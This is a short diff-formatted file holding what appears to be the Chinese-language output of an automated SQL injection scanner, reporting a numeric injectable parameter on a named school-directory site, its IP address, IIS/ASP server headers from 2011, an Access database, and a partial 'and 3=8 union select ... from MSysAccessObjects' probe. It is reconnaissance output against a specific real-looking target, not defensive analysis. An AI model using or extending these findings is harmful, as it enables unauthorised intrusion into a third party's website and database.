@@ -1,0 +1,25 @@
+■漏洞信息:============================================================
+ ·URL:http://web.e0575.com/school/list.asp?id=0
+ ·页面标题：全国普通高校名单 - 全国高校网址大全
+ ·参数:id=0
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:122.224.8.136
+ ·数据库:未知
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 10 Sep 2011 12:53:19 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 29503
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQCTCDABC=AIEEGJIBAEEIFILPONDOIEEF; path=/
+Cache-control: private
+
+
+ ·数据库:Access
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
